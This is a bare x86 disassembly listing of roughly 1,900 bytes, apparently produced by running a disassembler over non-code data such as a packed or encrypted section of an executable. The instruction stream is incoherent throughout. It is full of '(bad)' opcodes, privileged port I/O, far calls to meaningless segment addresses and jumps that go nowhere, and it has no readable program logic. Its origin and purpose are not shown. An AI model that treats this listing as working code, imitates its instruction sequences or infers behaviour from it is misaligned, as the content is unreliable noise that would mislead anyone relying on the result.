  4029b1:	rcl    DWORD PTR [edi],1
  4029b3:	cmp    dl,BYTE PTR [ebx+0x61]
  4029b6:	push   ebx
  4029b7:	int    0x63
  4029b9:	pop    esp
  4029ba:	out    0x73,al
  4029bc:	loopne 0x402a18
  4029be:	mov    ecx,0x35be8576
  4029c3:	fdivr  DWORD PTR [ebp-0x12]
  4029c6:	loopne 0x402949
  4029c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029c9:	(bad)  
  4029ca:	pop    ecx
  4029cb:	add    al,0xbe
  4029cd:	adc    cl,dh
  4029cf:	das    
  4029d0:	shl    BYTE PTR [esi+eax*4-0x7865a397],1
  4029d7:	pop    esp
  4029d8:	retf   0xdde5
  4029db:	and    eax,0x301b45d8
  4029e0:	add    eax,0x2a1f116a
  4029e5:	mov    cs,WORD PTR [esi]
  4029e7:	(bad)  [edx+0x42]
  4029ea:	sub    esp,DWORD PTR [esi+0x6db9852b]
  4029f0:	push   ss
  4029f1:	stos   BYTE PTR es:[edi],al
  4029f2:	scas   eax,DWORD PTR es:[edi]
  4029f3:	push   ebx
  4029f4:	push   edx
  4029f5:	and    cl,BYTE PTR [eax+0x7d897716]
  4029fb:	push   ebx
  4029fc:	mov    ds:0x154fbf31,eax
  402a01:	outs   dx,BYTE PTR ds:[esi]
  402a02:	rol    BYTE PTR [edi],0xb0
  402a05:	into   
  402a06:	push   es
  402a07:	xor    al,0x25
  402a09:	repz shl BYTE PTR [ebp+0x1554e3dc],0x50
  402a11:	jnp    0x402a55
  402a13:	mov    edi,0x202c75f9
  402a18:	pop    edx
  402a19:	xor    eax,0x6973223c
  402a1e:	cld    
  402a1f:	jns    0x402a4d
  402a21:	push   0xc
  402a23:	pop    ds
  402a24:	aas    
  402a25:	and    al,0x30
  402a27:	fild   WORD PTR [edx-0x52e8e88f]
  402a2d:	cmp    eax,0x8d60aae5
  402a32:	or     al,0xb4
  402a34:	mov    esi,0x3bd2e92e
  402a39:	jmp    0xb4b853b8
  402a3e:	jns    0x402a7e
  402a40:	jb     0x402a07
  402a42:	mov    eax,ds:0x882b2209
  402a47:	and    dh,0xe9
  402a4a:	idiv   BYTE PTR [ebp+edx*2+0x48]
  402a4e:	retf   
  402a4f:	mov    al,0x30
  402a51:	aas    
  402a52:	(bad)  
  402a53:	xor    eax,0x404a1d47
  402a58:	and    DWORD PTR [eax+edi*1+0x36],eax
  402a5c:	sub    ebp,DWORD PTR [edx+0x300fe9c2]
  402a62:	sbb    al,0xca
  402a64:	adc    cl,BYTE PTR [ecx-0x6e]
  402a67:	mov    dh,0x6e
  402a69:	pop    esp
  402a6a:	and    BYTE PTR [esi-0x61e21666],dh
  402a70:	mov    al,0x46
  402a72:	ror    ecx,0xda
  402a75:	mov    al,ds:0x5a79dd5f
  402a7a:	mov    bl,0xed
  402a7c:	fcomp  QWORD PTR [esi]
  402a7e:	or     edi,eax
  402a80:	jbe    0x402acd
  402a82:	dec    esp
  402a83:	imul   eax,DWORD PTR [edi],0xe38ed159
  402a89:	lea    esp,[ebp-0x73]
  402a8c:	loop   0x402a63
  402a8e:	add    eax,DWORD PTR [ecx]
  402a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a91:	add    bh,BYTE PTR [eax+0x1d]
  402a94:	ret    0xf7df
  402a97:	stos   DWORD PTR es:[edi],eax
  402a98:	(bad)  
  402a99:	mov    esp,0x81db1bb8
  402a9e:	mov    ax,0xf274
  402aa2:	sub    ebp,DWORD PTR [ecx+0x25]
  402aa5:	data16 loope 0x402ac6
  402aa8:	jnp    0x402a91
  402aaa:	push   esp
  402aab:	hlt    
  402aac:	retf   
  402aad:	mov    ebx,DWORD PTR [eax-0x39]
  402ab0:	dec    esp
  402ab1:	repz or BYTE PTR [ebx+0x48],dh
  402ab5:	mov    ds:0x375b057c,al
  402aba:	xchg   ebx,eax
  402abb:	mov    ds:0xe58bf904,eax
  402ac0:	call   0x21c4:0x94bbd43b
  402ac7:	add    al,0x48
  402ac9:	inc    ecx
  402aca:	aaa    
  402acb:	push   ebx
  402acc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ace:	test   eax,0x87c18d38
  402ad3:	mov    al,0x5c
  402ad5:	lods   al,BYTE PTR ds:[esi]
  402ad6:	xchg   DWORD PTR [eax],esp
  402ad8:	lods   al,BYTE PTR cs:[esi]
  402ada:	out    dx,al
  402adb:	aaa    
  402adc:	mov    dh,0x13
  402ade:	adc    dh,dh
  402ae0:	mov    ebx,0x533dd83f
  402ae5:	pushw  cs
  402ae7:	pushf  
  402ae8:	xchg   ebp,eax
  402ae9:	jecxz  0x402aab
  402aeb:	push   ss
  402aec:	push   edi
  402aed:	adc    al,0xa7
  402aef:	pop    edx
  402af0:	push   edi
  402af1:	retf   0x4e8
  402af4:	jo     0x402b68
  402af6:	lock jmp esp
  402af9:	pop    ecx
  402afa:	inc    ecx
  402afb:	pop    esi
  402afc:	add    ecx,ecx
  402afe:	mov    edi,0x41db898c
  402b03:	in     al,dx
  402b04:	cmp    ch,dl
  402b06:	imul   esi,edx,0xa6019815
  402b0c:	pop    edx
  402b0d:	(bad)  
  402b0e:	leave  
  402b0f:	js     0x402b0b
  402b11:	popf   
  402b12:	in     al,dx
  402b13:	into   
  402b14:	dec    ebp
  402b15:	mov    ah,0xb3
  402b17:	arpl   ax,bp
  402b19:	sub    al,0x8d
  402b1b:	pop    ebp
  402b1c:	pop    edi
  402b1d:	ficomp DWORD PTR [eax+0x161ae62d]
  402b23:	add    al,0x97
  402b25:	paddsw mm5,mm2
  402b28:	ja     0x402b80
  402b2a:	enter  0xfa07,0x78
  402b2e:	or     bl,0xd5
  402b31:	pop    ebp
  402b32:	push   0xd7718532
  402b37:	iret   
  402b38:	pop    ebp
  402b39:	sbb    eax,0xc80de1db
  402b3e:	xchg   ebx,eax
  402b3f:	test   al,0xde
  402b41:	xchg   edx,eax
  402b42:	mov    dh,0x9f
  402b44:	fwait
  402b45:	lock xchg esi,eax
  402b47:	mov    ch,BYTE PTR [edx-0x489a22b5]
  402b4d:	stos   BYTE PTR es:[edi],al
  402b4e:	mov    fs,eax
  402b50:	jmp    0x9c0f34e4
  402b55:	and    al,0xd7
  402b57:	jns    0x402b35
  402b59:	push   ecx
  402b5a:	(bad)  
  402b5b:	cld    
  402b5c:	lods   al,BYTE PTR ds:[esi]
  402b5d:	push   ds
  402b5e:	lods   al,BYTE PTR ds:[esi]
  402b5f:	sub    eax,0xee252399
  402b64:	retf   
  402b65:	cmp    DWORD PTR [esi+0x3a41de17],ecx
  402b6b:	jl     0x402b3d
  402b6d:	repz scas al,BYTE PTR es:[edi]
  402b6f:	cmc    
  402b70:	call   0x629a:0x32ff7c31
  402b77:	cmp    al,0xcb
  402b79:	call   0x336057b9
  402b7e:	push   esi
  402b7f:	mov    eax,0x640b1311
  402b84:	jo     0x402b2f
  402b86:	in     al,dx
  402b87:	jg     0x402b8e
  402b89:	cdq    
  402b8a:	addr16 es push eax
  402b8d:	pop    ebx
  402b8e:	add    eax,0x43b2f22b
  402b93:	jmp    0x1883c80f
  402b98:	bound  esi,QWORD PTR [ecx]
  402b9a:	cmp    ah,BYTE PTR ds:0xebda8c4a
  402ba0:	(bad)  
  402ba2:	pop    esi
  402ba3:	leave  
  402ba4:	jne    0x402b2e
  402ba6:	sbb    DWORD PTR [edi],ebx
  402ba8:	ret    
  402ba9:	dec    esi
  402baa:	add    al,bh
  402bac:	mov    ebp,0xf230d480
  402bb1:	(bad)  
  402bb2:	sub    al,0xe7
  402bb4:	in     eax,0x8e
  402bb6:	jmp    0x402bf8
  402bb8:	fcomip st,st(2)
  402bba:	outs   dx,DWORD PTR ds:[esi]
  402bbb:	pop    esp
  402bbc:	push   eax
  402bbd:	cmp    ebp,0xffffff89
  402bc0:	fstp   TBYTE PTR [eax+0x3fc7c934]
  402bc6:	scas   eax,DWORD PTR es:[edi]
  402bc7:	sbb    BYTE PTR [eax-0xac2b466],dl
  402bcd:	ss in  al,0xb6
  402bd0:	mov    ?,WORD PTR [edi-0x4a]
  402bd3:	jmp    0xb7316c66
  402bd8:	rcr    BYTE PTR ds:0xe65931b6,1
  402bde:	push   ds
  402bdf:	or     bh,bh
  402be1:	scas   al,BYTE PTR es:[edi]
  402be2:	push   esi
  402be3:	push   0x69
  402be5:	out    0x59,eax
  402be7:	retf   
  402be8:	pop    ebx
  402be9:	nop
  402bea:	sub    DWORD PTR [edi+0x77],ebx
  402bed:	mov    cl,0x37
  402bef:	push   edx
  402bf0:	and    dl,bh
  402bf2:	push   0xfb5f909c
  402bf7:	mov    dl,0x66
  402bf9:	adc    ecx,DWORD PTR [esi+0x3a466724]
  402bff:	out    0x6,al
  402c01:	cld    
  402c02:	call   0xc85e83ee
  402c07:	inc    ecx
  402c08:	add    ebx,DWORD PTR [ecx+eiz*2+0x5d665086]
  402c0f:	inc    edi
  402c10:	or     DWORD PTR ds:0xbf3abd69,0x6d
  402c17:	lds    eax,FWORD PTR [edx]
  402c19:	inc    esi
  402c1a:	retf   
  402c1b:	push   edi
  402c1c:	cmp    ecx,DWORD PTR [ecx-0x40]
  402c1f:	jb     0x402bd4
  402c21:	push   edi
  402c22:	sub    BYTE PTR [esi],al
  402c24:	sbb    eax,0x7087d2c1
  402c29:	cmp    ch,BYTE PTR [edx+0x7e]
  402c2c:	rol    DWORD PTR [esi],cl
  402c2e:	sbb    BYTE PTR [edx],bl
  402c30:	neg    BYTE PTR [edx+0x668528f6]
  402c36:	leave  
  402c37:	push   edi
  402c38:	mov    ds:0xf52ece8e,al
  402c3d:	gs dec edi
  402c3f:	jmp    0xeb3d:0xfb63dabc
  402c46:	xor    eax,0x57e94d64
  402c4b:	das    
  402c4c:	jb     0x402c90
  402c4e:	aad    0x30
  402c50:	push   cs
  402c51:	push   0xdb58ad5e
  402c56:	adc    DWORD PTR [ecx+0x13a30c8e],edx
  402c5c:	cs push ecx
  402c5e:	push   edi
  402c5f:	into   
  402c60:	icebp  
  402c61:	lds    esp,FWORD PTR [esi-0x43]
  402c64:	cmp    al,0x80
  402c66:	add    dh,cl
  402c68:	neg    DWORD PTR [edx+0x10]
  402c6b:	inc    ebx
  402c6c:	jp     0x402cc7
  402c6e:	or     DWORD PTR [eax+0x38],edi
  402c71:	outs   dx,DWORD PTR ds:[esi]
  402c72:	push   cs
  402c73:	xchg   DWORD PTR [ebx-0x3d],esi
  402c76:	bound  ebx,QWORD PTR [ecx]
  402c78:	cmp    bh,BYTE PTR [edx+0x11]
  402c7b:	aad    0x5a
  402c7d:	mov    al,0x7c
  402c7f:	or     al,0xc9
  402c81:	outs   dx,BYTE PTR ds:[esi]
  402c82:	rcr    DWORD PTR [edi-0x5999ec56],0x36
  402c89:	or     ebp,esi
  402c8b:	push   eax
  402c8c:	out    dx,eax
  402c8d:	jp     0x402c77
  402c8f:	sbb    BYTE PTR [eax-0x7],dl
  402c92:	add    edx,DWORD PTR [ebx]
  402c94:	xchg   esp,eax
  402c95:	push   esp
  402c96:	loop   0x402cc4
  402c98:	sub    dh,0xfe
  402c9b:	cli    
  402c9c:	cdq    
  402c9d:	outs   dx,BYTE PTR ds:[esi]
  402c9e:	pop    eax
  402c9f:	fwait
  402ca0:	mov    ecx,0x63a6dd17
  402ca5:	dec    edx
  402ca6:	outs   dx,DWORD PTR ds:[esi]
  402ca7:	cmp    cl,bl
  402ca9:	lds    edi,FWORD PTR [ebp-0x6fd266b2]
  402caf:	imul   edi,DWORD PTR [ebx-0xe],0xfadd6219
  402cb6:	retf   
  402cb7:	(bad)  
  402cb9:	ja     0x402ca3
  402cbb:	sub    edx,ebx
  402cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cbe:	sub    DWORD PTR [eax+0x55],esp
  402cc1:	and    eax,0x22cb773a
  402cc6:	and    al,0x6e
  402cc8:	pop    ebp
  402cc9:	jns    0x402c81
  402ccb:	sbb    bh,BYTE PTR [ecx+0x44b13e2c]
  402cd1:	out    0xeb,eax
  402cd3:	xchg   BYTE PTR [edi],ch
  402cd5:	mov    ch,0xe3
  402cd7:	aaa    
  402cd8:	cmp    edi,0xffffff88
  402cdb:	fild   WORD PTR [ecx-0x2c]
  402cde:	inc    ecx
  402cdf:	xchg   BYTE PTR [eax],al
  402ce1:	sbb    ah,BYTE PTR [ecx+0x5fb8561f]
  402ce7:	mov    edi,DWORD PTR [ebx]
  402ce9:	retf   0xde5e
  402cec:	jo     0x402d51
  402cee:	cmp    al,0x54
  402cf0:	jmp    0x402c96
  402cf2:	jno    0x402c9c
  402cf4:	pop    edx
  402cf5:	xchg   ebp,eax
  402cf6:	sub    ecx,DWORD PTR [esi]
  402cf8:	popa   
  402cf9:	test   al,ah
  402cfb:	mov    ds:0x9103f58,eax
  402d00:	dec    ebx
  402d01:	out    dx,al
  402d02:	outs   dx,DWORD PTR ds:[esi]
  402d03:	mov    ebp,0x49a9268d
  402d08:	inc    esi
  402d09:	mov    esp,0xac936354
  402d0e:	loope  0x402ccb
  402d10:	adc    ebp,DWORD PTR [edi]
  402d12:	push   ecx
  402d13:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  402d15:	mov    dh,0x82
  402d17:	es inc edx
  402d19:	add    eax,0xe694dbf8
  402d1e:	add    ah,bl
  402d20:	mov    cl,0xc8
  402d22:	icebp  
  402d23:	in     eax,dx
  402d24:	mov    esp,0x3af5dc61
  402d29:	call   0x54fa:0xcc0168ff
  402d30:	mov    dh,0x1a
  402d32:	xchg   esi,esp
  402d34:	ss mov esi,0x184c899a
  402d3a:	xor    DWORD PTR [eax+esi*2-0x42],ecx
  402d3e:	sbb    eax,0x438a15e9
  402d43:	arpl   WORD PTR [ebx-0x55],dx
  402d46:	adc    eax,0x5a4fbd6
  402d4b:	cmp    al,0x81
  402d4d:	or     esp,DWORD PTR [ebp-0x46432145]
  402d53:	(bad)  
  402d55:	mov    ds:0xd47d408e,al
  402d5a:	stos   BYTE PTR es:[edi],al
  402d5b:	into   
  402d5c:	push   eax
  402d5d:	in     eax,dx
  402d5e:	retf   
  402d5f:	repnz dec BYTE PTR ds:0x6bb0e8b4
  402d66:	aad    0xf1
  402d68:	cmp    eax,0xfba24772
  402d6d:	xor    eax,0x6ed8bd16
  402d72:	pop    ds
  402d73:	pusha  
  402d74:	in     eax,0x90
  402d76:	scas   al,BYTE PTR es:[edi]
  402d77:	cmp    eax,esp
  402d79:	rep lods al,BYTE PTR ds:[esi]
  402d7b:	lea    esp,[edx+0x412ead3a]
  402d81:	popf   
  402d82:	mov    esp,DWORD PTR [eax+0x7975f728]
  402d88:	sub    BYTE PTR [ebx],dl
  402d8a:	xchg   edi,eax
  402d8b:	daa    
  402d8c:	inc    ebp
  402d8d:	and    eax,DWORD PTR [esi-0xf]
  402d90:	shl    DWORD PTR [ebx],cl
  402d92:	xlat   BYTE PTR es:[ebx]
  402d94:	push   ebp
  402d95:	mov    bh,0xec
  402d97:	pop    ecx
  402d98:	sbb    al,0xcc
  402d9a:	push   edx
  402d9b:	mov    ebx,0x6b11d244
  402da0:	add    DWORD PTR [eax+edx*2+0x20],esp
  402da4:	xor    ecx,edi
  402da6:	(bad)  
  402da7:	js     0x402de9
  402da9:	enter  0x4fbe,0x53
  402dad:	test   eax,0x8788cb88
  402db2:	cwde   
  402db3:	out    0x9e,al
  402db5:	fcmovnb st,st(2)
  402db7:	xchg   DWORD PTR [ebx],esi
  402db9:	out    0x32,al
  402dbb:	push   esi
  402dbc:	inc    BYTE PTR [edi]
  402dbe:	loope  0x402d8a
  402dc0:	dec    ebp
  402dc1:	stc    
  402dc2:	push   edi
  402dc3:	les    edi,FWORD PTR [edi+0x1c]
  402dc6:	sub    ebx,DWORD PTR [eax-0x75]
  402dc9:	in     eax,0x83
  402dcb:	pop    ds
  402dcc:	outs   dx,BYTE PTR ds:[esi]
  402dcd:	and    ecx,DWORD PTR [ebx-0x7b]
  402dd0:	jecxz  0x402e4f
  402dd2:	jne    0x402e27
  402dd4:	sub    al,0xf6
  402dd6:	icebp  
  402dd7:	pop    es
  402dd8:	or     al,0x88
  402dda:	sbb    DWORD PTR [esi],eax
  402ddc:	mov    eax,0x2554dad8
  402de1:	int3   
  402de2:	mov    ecx,0x97a7b0e0
  402de7:	pop    ebp
  402de8:	pop    es
  402de9:	sub    esi,esp
  402deb:	aad    0x0
  402ded:	lods   eax,DWORD PTR ds:[esi]
  402dee:	add    DWORD PTR [ecx+0x57],edi
  402df1:	jne    0x402e6a
  402df3:	dec    eax
  402df4:	adc    eax,0x417d9c70
  402df9:	xlat   BYTE PTR ds:[ebx]
  402dfa:	call   0x3f9a:0x60071d6a
  402e01:	jmp    0x641def9a
  402e06:	loope  0x402d90
  402e08:	fisubr WORD PTR [edi+0x175f6b4]
  402e0e:	or     ah,BYTE PTR [ebp+ebp*4-0x19b72a5d]
  402e15:	xchg   esi,eax
  402e16:	add    al,0xa6
  402e18:	push   esp
  402e19:	xchg   edi,eax
  402e1a:	push   0xffffffe8
  402e1c:	mov    edx,0x6fb28a0
  402e21:	dec    esp
  402e22:	or     al,0x55
  402e24:	and    DWORD PTR [esi],esi
  402e26:	ds inc ecx
  402e28:	mov    ecx,0x46667f0d
  402e2d:	outs   dx,BYTE PTR ds:[esi]
  402e2e:	cld    
  402e2f:	cdq    
  402e30:	push   ebx
  402e31:	adc    esp,edi
  402e33:	pop    ecx
  402e34:	(bad)  
  402e35:	or     DWORD PTR [esi+0x32],esi
  402e38:	or     edx,edi
  402e3a:	mov    ah,0x22
  402e3c:	adc    dl,BYTE PTR [edi]
  402e3e:	mov    dl,0x1c
  402e40:	ficom  WORD PTR [eax-0x51d4fbef]
  402e46:	je     0x402e2a
  402e48:	lds    ebx,FWORD PTR [eax+ebx*1-0x5e]
  402e4c:	or     BYTE PTR [edi+0x713c2d49],ch
  402e52:	xlat   BYTE PTR ds:[ebx]
  402e53:	in     al,dx
  402e54:	inc    eax
  402e55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e56:	mov    dh,BYTE PTR ds:0x28b99937
  402e5c:	mov    eax,0x411c6074
  402e61:	rep repnz movs DWORD PTR es:[edi],DWORD PTR gs:[esi]
  402e65:	(bad)  
  402e66:	mov    al,0xfd
  402e68:	test   al,0xb3
  402e6a:	fcom   DWORD PTR [edx+0x27]
  402e6d:	in     eax,dx
  402e6e:	pop    edx
  402e6f:	stos   DWORD PTR es:[edi],eax
  402e70:	leave  
  402e71:	push   edi
  402e72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e73:	scas   al,BYTE PTR es:[edi]
  402e74:	popa   
  402e75:	test   eax,0xb2646b1f
  402e7a:	test   DWORD PTR [ecx],0x784fe89f
  402e80:	sbb    al,0xc1
  402e82:	cmp    DWORD PTR [ebx],ebp
  402e84:	ss scas al,BYTE PTR es:[edi]
  402e86:	fs inc eax
  402e88:	imul   edi,DWORD PTR [edi-0x53],0x6a1c34fa
  402e8f:	sbb    ah,bh
  402e91:	daa    
  402e92:	popa   
  402e93:	sar    BYTE PTR [edx],1
  402e95:	cmp    esp,DWORD PTR [edi+eiz*4+0x48]
  402e99:	mov    bh,0xa8
  402e9b:	aam    0xc3
  402e9d:	inc    ebp
  402e9e:	rsqrtps xmm5,XMMWORD PTR [eax]
  402ea1:	jnp    0x402e8d
  402ea3:	xor    eax,0x396b3e37
  402ea8:	icebp  
  402ea9:	jmp    0x402ee2
  402eab:	push   ds
  402eac:	es out dx,eax
  402eae:	and    al,0xfa
  402eb0:	int3   
  402eb1:	je     0x402ef3
  402eb3:	ret    
  402eb4:	adc    bl,ah
  402eb6:	pop    eax
  402eb7:	loope  0x402ee9
  402eb9:	cmp    eax,0x4977040c
  402ebe:	call   0x144df47
  402ec3:	test   eax,0xebea0913
  402ec8:	std    
  402ec9:	scas   al,BYTE PTR es:[edi]
  402eca:	cmp    esi,DWORD PTR [edx-0x4d]
  402ecd:	test   DWORD PTR [eax+0x192960a],ecx
  402ed3:	pop    es
  402ed4:	sbb    BYTE PTR [edi-0x45],dl
  402ed7:	call   0xfea5:0xcde30f28
  402ede:	xchg   esp,eax
  402edf:	test   eax,0x9bdf5205
  402ee4:	sbb    eax,0x8281f5d
  402ee9:	sub    al,0xc9
  402eeb:	fcmovnb st,st(7)
  402eed:	stos   BYTE PTR es:[edi],al
  402eee:	loop   0x402f1d
  402ef0:	mov    ds:0x68df03f3,al
  402ef5:	mov    ah,0x24
  402ef7:	jmp    0xf0eb2c69
  402efc:	jo     0x402f30
  402efe:	and    al,0xfc
  402f00:	cli    
  402f01:	test   eax,0x6e8034f3
  402f06:	inc    ebx
  402f07:	popf   
  402f08:	rcr    DWORD PTR [eax+edi*2-0x30],0x65
  402f0d:	pusha  
  402f0e:	push   edx
  402f0f:	loopne 0x402ea5
  402f11:	push   0xffffffd2
  402f13:	call   0xcf3c:0xdd251095
  402f1a:	or     eax,0x2325ccf5
  402f1f:	aad    0x94
  402f21:	cmp    eax,0x3e17de95
  402f26:	dec    ebx
  402f27:	icebp  
  402f28:	not    BYTE PTR [ebp-0x28772256]
  402f2e:	std    
  402f2f:	push   edx
  402f30:	mov    bh,0xb3
  402f32:	mov    esi,0x1710b30
  402f37:	dec    sp
  402f39:	ja     0x402f4e
  402f3b:	sub    BYTE PTR [edi],0x17
  402f3e:	sub    ebp,DWORD PTR [esi]
  402f40:	ss mov bl,0xe7
  402f43:	int    0x46
  402f45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f46:	push   ss
  402f47:	inc    ebp
  402f48:	adc    dl,dh
  402f4a:	cmp    dh,BYTE PTR [eax]
  402f4c:	test   BYTE PTR [eax+0xeaad3a0],bl
  402f52:	xor    al,0x51
  402f54:	ja     0x402fb1
  402f56:	push   0xffffffc5
  402f58:	nop
  402f59:	xor    edi,DWORD PTR [ecx+0x2e702bd8]
  402f5f:	(bad)  
  402f60:	lods   al,BYTE PTR ds:[esi]
  402f61:	mov    esi,0x1365dcb
  402f66:	push   esi
  402f67:	xor    DWORD PTR [eax+0x79],esi
  402f6a:	cmc    
  402f6b:	scas   al,BYTE PTR es:[edi]
  402f6c:	lods   al,BYTE PTR ds:[esi]
  402f6d:	repz sbb al,0xab
  402f70:	fidivr DWORD PTR [eax]
  402f72:	mov    dl,0x1f
  402f74:	fs mov dl,0x1a
  402f77:	arpl   WORD PTR [edi+ebp*4],sp
  402f7a:	jnp    0x402f3a
  402f7c:	add    eax,0x67696e4c
  402f81:	inc    ecx
  402f82:	mov    cs,WORD PTR [edi*8-0x45fdafa5]
  402f89:	jno    0x403009
  402f8b:	push   ebp
  402f8c:	jp     0x402fdc
  402f8e:	js     0x402ff9
  402f90:	dec    edi
  402f91:	jl     0x402fd3
  402f93:	push   edi
  402f94:	jbe    0x402f6a
  402f96:	outs   dx,DWORD PTR ds:[esi]
  402f97:	jecxz  0x402ff7
  402f99:	mov    al,ds:0x624c6bae
  402f9e:	inc    ebp
  402f9f:	add    bl,0xe3
  402fa2:	bound  esi,QWORD PTR [edi+0x5bb416c]
  402fa8:	dec    ebp
  402fa9:	sahf   
  402faa:	sbb    DWORD PTR [eax-0x20],esi
  402fad:	mov    si,0xfb7c
  402fb1:	iret   
  402fb2:	adc    al,0x35
  402fb4:	dec    esp
  402fb5:	cmc    
  402fb6:	mov    ebx,0x58f371ed
  402fbb:	push   0xd85b54fa
  402fc0:	dec    esi
  402fc1:	push   ss
  402fc2:	and    bl,cl
  402fc4:	jb     0x403013
  402fc6:	inc    eax
  402fc7:	ss enter 0xd05c,0xfb
  402fcc:	pusha  
  402fcd:	rcl    BYTE PTR [edi],cl
  402fcf:	push   0x17
  402fd1:	add    DWORD PTR [edi],edi
  402fd3:	in     al,dx
  402fd4:	popf   
  402fd5:	push   ds
  402fd6:	mov    ah,0x8e
  402fd8:	sbb    ebp,DWORD PTR [esi-0xd]
  402fdb:	je     0x403018
  402fdd:	cmp    esp,esi
  402fdf:	push   esi
  402fe0:	cmp    dl,0x86
  402fe3:	hlt    
  402fe4:	je     0x402f7e
  402fe6:	arpl   WORD PTR [esi],sp
  402fe8:	adc    DWORD PTR [esi-0x3a],esp
  402feb:	mov    ds:0xacf38299,eax
  402ff0:	lahf   
  402ff1:	lods   al,BYTE PTR ds:[esi]
  402ff2:	inc    edx
  402ff3:	enter  0x7c54,0xe4
  402ff7:	pushf  
  402ff8:	pop    ds
  402ff9:	pushf  
  402ffa:	test   ebp,eax
  402ffc:	repz int3 
  402ffe:	(bad)  
  402fff:	jmp    DWORD PTR [ecx]
  403001:	add    BYTE PTR [edi-0x28507b87],dl
  403007:	adc    BYTE PTR [ebx+0x24d364f],al
  40300d:	dec    esp
  40300e:	in     al,dx
  40300f:	push   ebx
  403010:	ss xor ah,bl
  403013:	mov    eax,0x7dee6ff4
  403018:	mov    esi,0x156585e2
  40301d:	dec    ebp
  40301e:	dec    edx
  40301f:	xchg   edi,eax
  403020:	push   esi
  403021:	add    edx,esi
  403023:	pop    edx
  403024:	push   esi
  403025:	ror    BYTE PTR [esi-0x650cb1e],1
  40302b:	idiv   BYTE PTR [ecx+esi*1]
  40302e:	dec    esi
  40302f:	leave  
  403030:	call   0xcab8:0x7230a74
  403037:	(bad)  
  403038:	std    
  403039:	push   ebp
  40303a:	pop    eax
  40303b:	call   0xeb53:0x31dd16c
  403042:	fcom   QWORD PTR [eax]
  403044:	in     eax,dx
  403045:	add    eax,DWORD PTR [ebx]
  403047:	in     al,0xe9
  403049:	scas   eax,DWORD PTR es:[edi]
  40304a:	jmp    0x6ad3866b
  40304f:	jne    0x403022
  403051:	jns    0x40309f
  403053:	rcr    edx,0x8d
  403056:	rol    edi,0xa2
  403059:	xchg   BYTE PTR [edi+ecx*8-0x2b4ed388],ah
  403060:	fistp  WORD PTR [edi]
  403062:	rcl    BYTE PTR es:[ecx+0x433342f5],1
  403069:	rcr    DWORD PTR ds:0x20f2a9c1,cl
  40306f:	call   0xd7aa:0xb15fe858
  403076:	and    eax,0x8f3650a3
  40307b:	retf   0xb517
  40307e:	rcr    BYTE PTR [ebx],cl
  403080:	ror    BYTE PTR [esp+ebp*4-0x8],cl
  403084:	popa   
  403085:	iret   
  403086:	fmulp  st(7),st
  403088:	push   edx
  403089:	jmp    0x403071
  40308b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40308c:	xchg   esi,eax
  40308d:	inc    ecx
  40308e:	int3   
  40308f:	inc    edi
  403090:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  403092:	jne    0x403066
  403094:	cmc    
  403095:	add    eax,0xf46262e8
  40309a:	xchg   esp,eax
  40309b:	mov    ebx,0x9c22c902
  4030a0:	sub    DWORD PTR [eax+eiz*2+0x79],edi
  4030a4:	stos   DWORD PTR es:[edi],eax
  4030a5:	xchg   BYTE PTR [ecx],bl
  4030a7:	xor    al,0x1d
  4030a9:	jmp    0xe7a84304
  4030ae:	lds    eax,FWORD PTR [esi-0x32]
  4030b1:	(bad)
  4030b4:	cmc    
  4030b5:	lahf   
  4030b6:	gs ja  0x40308a
  4030b9:	in     al,0x12
  4030bb:	outs   dx,DWORD PTR ds:[esi]
  4030bc:	nop
  4030bd:	shl    esi,0x21
  4030c0:	loop   0x4030ea
  4030c2:	retf   0xb239
  4030c5:	push   0xeda2ea50
  4030ca:	idiv   edi
  4030cc:	xchg   esp,eax
  4030cd:	sub    BYTE PTR [esi-0x6],bl
  4030d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030d1:	call   0x8b569756
  4030d6:	xor    eax,0x14fcc576
  4030db:	daa    
  4030dc:	fwait
  4030dd:	jp     0x4030f0
  4030df:	cmp    ebp,0xd
  4030e2:	adc    BYTE PTR [edi+ebp*2+0x2f],bl
  4030e6:	stos   BYTE PTR es:[edi],al
  4030e7:	outs   dx,DWORD PTR ds:[esi]
  4030e8:	imul   edi,eax,0x6a
  4030eb:	fistp  QWORD PTR [ebp-0x56]
  4030ee:	xchg   ebx,eax
  4030ef:	imul   ebx
  4030f1:	xor    esp,DWORD PTR [ebx+0x75]
  4030f4:	inc    edi
  4030f5:	inc    ebx
  4030f6:	daa    
  4030f7:	popf   
  4030f8:	out    0xa2,al
  4030fa:	push   0x4ec9ce5c
  4030ff:	bound  ecx,QWORD PTR [esi+0xa6d0098]
  403105:	xor    ch,cl
  403107:	test   al,0x89
  403109:	int3   
  40310a:	lea    ebp,[ebp+eiz*8-0x5]
  40310e:	loope  0x4030cb
  403110:	bound  ebp,QWORD PTR [ebx]
  403112:	push   esi
  403113:	push   cs
  403114:	dec    esi
  403115:	fisub  DWORD PTR [eax]
  403117:	add    bl,ch
  403119:	sti    
  40311a:	pop    dx
  40311c:	jge    0x4030b5
  40311e:	stc    
  40311f:	jmp    FWORD PTR [edi]
  403121:	mov    dl,0x3d
  403123:	aaa    
  403124:	stc    
  403125:	mov    cl,0x12
  403127:	sub    al,0xb1
  403129:	pop    esi
  40312a:	xor    DWORD PTR [eax],eax
  40312c:	lods   eax,DWORD PTR ds:[esi]
  40312d:	push   esi
  40312e:	xor    edx,ebx
  403130:	mov    dl,0x27
  403132:	xor    eax,0xc8665a29
  403137:	sahf   
  403138:	in     al,0x91
  40313a:	mov    ebp,0x5b340c46
  40313f:	dec    edi
  403140:	xchg   esi,eax
  403141:	out    0xdc,eax
  403143:	std    
  403144:	or     ah,BYTE PTR [edi+0x278c138f]
  40314a:	fnsave [esi]
  40314c:	pop    ebx
  40314d:	push   0x6c
  40314f:	fcmovb st,st(3)
  403151:	push   esp
  403152:	cli    
  403153:	int3   
  403154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
